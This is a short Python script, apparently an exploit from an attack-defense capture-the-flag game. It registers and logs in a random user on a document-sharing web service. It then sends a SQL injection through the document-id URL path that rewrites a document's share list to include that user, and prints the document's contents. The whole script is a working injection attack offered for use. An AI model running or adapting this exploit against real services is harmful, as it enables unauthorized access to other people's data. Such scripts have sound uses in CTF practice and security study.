#!/usr/bin/env python3

import json
import logging
import os
import random
import requests
import string
import sys

def random_name(length=10):
    return ''.join(random.choices(
        string.ascii_lowercase + string.digits, k=length))

HOST, FLAG_ID = sys.argv[1], sys.argv[2]

base_url = f"http://{HOST}/"
session = requests.Session()

title, org = FLAG_ID.split("@", 1)
login = random_name()
password = random_name()

url = f"{base_url}register"
user_info = {"login": login, "password": password, "org": org}
r = session.post(url, json=user_info)
user_id = r.json()["user_id"]

url = f"{base_url}login"
r = session.post(url, json=user_info)

url = f"{base_url}docs"
r = session.get(url)
doc_id = r.json()["docs"][0]["id"]

hack_doc_id = f"-1';update docs set shares = '{{ {user_id} }}' where id = '{doc_id}"
print(hack_doc_id)
url = f"{base_url}contents/{hack_doc_id}"
session.get(url)

url = f"{base_url}contents/{doc_id}"
r = session.get(url)
print(r.text)
